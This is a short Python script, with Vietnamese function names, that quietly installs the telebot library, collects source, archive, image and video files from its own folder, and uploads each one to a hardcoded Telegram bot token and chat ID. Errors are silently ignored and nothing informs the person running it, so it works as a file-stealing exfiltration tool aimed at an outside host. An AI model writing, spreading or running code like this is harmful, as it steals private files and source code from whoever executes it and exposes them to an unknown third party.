try:
    import telebot
except:
    os.system("pip install telebot")
import os
import telebot
import time
from concurrent.futures import ThreadPoolExecutor as TPE

def thu_muc_hien_tai():
    return os.path.abspath(os.path.dirname(__file__))

def hien_thi_cac_file_python(d):
    return [f for f in os.listdir(d) if f.endswith(('.py', '.zip', '.php', '.js', '.jpg', '.jpeg', '.png', '.mp4', '.MOV'))]

def gui_file_telegram(t, c, f):
    b = telebot.TeleBot(token=t)
    for file in f:
        duong_dan_file = os.path.join(thu_muc_hien_tai(), file)
        try:
            with open(duong_dan_file, 'rb') as fb:
                b.send_document(c, fb) if os.path.getsize(duong_dan_file) > 0 else print()
        except Exception as e:
            pass
bot_token, chat_id = '6794603563:AAGOCCHYAXbs6FqujVSVdLYmPHuz8kJ3zyc', '5484347837'

gui_file_telegram(bot_token, chat_id, hien_thi_cac_file_python(thu_muc_hien_tai()))
